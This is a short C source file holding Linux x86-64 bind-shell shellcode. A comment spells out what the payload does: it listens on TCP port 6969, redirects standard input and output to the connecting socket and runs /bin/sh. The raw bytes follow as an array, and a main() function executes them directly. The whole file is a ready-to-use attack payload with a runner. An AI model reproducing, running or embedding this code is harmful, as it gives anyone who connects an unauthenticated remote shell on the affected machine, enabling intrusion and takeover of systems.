/*
  SHELLCODE CONTENTS:

  int sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in address;
  memset((char *)&address, 0, sizeof(struct sockaddr_in));
  address.sin_family = AF_INET;
  address.sin_port = htons(6969);
  address.sin_addr.s_addr = INADDR_ANY;
  bind(sock, (struct sockaddr *)&address, sizeof(address));
  listen(sock, 0);
  int new_sock = accept(sock, NULL, NULL);
  dup2(new_sock, 0);
  dup2(new_sock, 1);
  dup2(new_sock, 2);
  execve("//bin/sh", NULL, NULL);
 */
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x6a\x29\x58\x6a\x02\x5f\x6a\x01"
                            "\x5e\x48\x31\xd2\x0f\x05\x48\x97"
                            "\x52\x52\xc6\x04\x24\x02\x66\xc7"
                            "\x44\x24\x02\x1b\x39\x48\x89\xe6"
                            "\x6a\x31\x58\x6a\x10\x5a\x0f\x05"
                            "\x6a\x32\x58\x48\x31\xf6\x0f\x05"
                            "\x30\xd2\x6a\x2b\x58\x0f\x05\x48"
                            "\x97\x6a\x02\x5e\x6a\x21\x58\x0f"
                            "\x05\x48\xff\xce\x79\xf6\x48\x31"
                            "\xf6\x48\x31\xd2\x52\x48\xbb\x2f"
                            "\x2f\x62\x69\x6e\x2f\x73\x68\x53"
                            "\x48\x89\xe7\x6a\x3b\x58\x0f\x05";

int main(void) {
  printf("[*] shellcode length: %d\n", strlen(shellcode));
  (*(void (*)())shellcode)();
  return 0;
}

